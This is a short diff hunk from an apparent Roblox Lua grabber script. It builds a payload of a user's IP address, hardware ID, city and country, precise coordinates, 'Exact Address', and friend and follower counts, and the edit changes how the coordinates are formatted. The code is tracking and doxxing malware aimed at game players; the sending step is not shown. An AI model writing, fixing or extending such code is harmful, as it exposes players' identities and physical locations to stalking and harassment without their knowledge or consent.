@@ -97,7 +97,7 @@ local payload = {
             {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
             {["name"] = "HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = true},
             {["name"] = "Location", ["value"] = location_data.city .. ", " .. location_data.regionName .. ", " .. location_data.country, ["inline"] = true},
-            {["name"] = "Coordinates", ["value"] = string.format("%.10f, %.10f", location_data.lat, location_data.lon), ["inline"] = true},
+            {["name"] = "Coordinates", ["value"] = location_data.lat .. ", " .. location_data.lon, ["inline"] = true},
             {["name"] = "Exact Address", ["value"] = address, ["inline"] = true},
             {["name"] = "Friends Count", ["value"] = #friends_list, ["inline"] = true},
             {["name"] = "Followers Count", ["value"] = #followers_list, ["inline"] = true},
